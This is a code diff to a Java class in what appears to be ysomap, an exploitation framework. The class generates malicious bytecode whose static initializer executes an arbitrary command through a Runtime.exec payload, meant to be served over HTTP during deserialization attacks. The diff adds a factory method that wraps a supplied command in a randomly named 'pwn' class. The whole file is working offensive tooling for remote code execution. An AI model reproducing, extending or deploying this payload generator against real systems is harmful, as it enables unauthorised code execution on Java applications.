@@ -1,9 +1,12 @@
 package ysomap.bullets.objects;
 
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
 import ysomap.core.util.PayloadHelper;
+
+import java.util.Random;
 
 /**
  * @author wh1t3P1g
@@ -14,7 +17,7 @@ import ysomap.core.util.PayloadHelper;
 @Details("用于生成恶意字节码，配合SimpleHTTPServer使用")
 @Targets({Targets.CODE})
 @Dependencies({"*"})
-public class ClassWithEvilStaticBlock implements Bullet<byte[]> {
+public class ClassWithEvilStaticBlock extends AbstractBullet<byte[]> {
 
     @NotNull
     @Require(name = "classname", detail = "所需生成的类名")
@@ -37,5 +40,13 @@ public class ClassWithEvilStaticBlock implements Bullet<byte[]> {
             code = PayloadHelper.makeRuntimeExecPayload(body);
         }
         return ClassFiles.makeClassWithStaticBlock(classname, code);
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        ClassWithEvilStaticBlock bullet = new ClassWithEvilStaticBlock();
+        bullet.set("type", "class");
+        bullet.set("body", args[0]);
+        bullet.set("classname", "pwn"+new Random().nextLong());
+        return bullet;
     }
 }
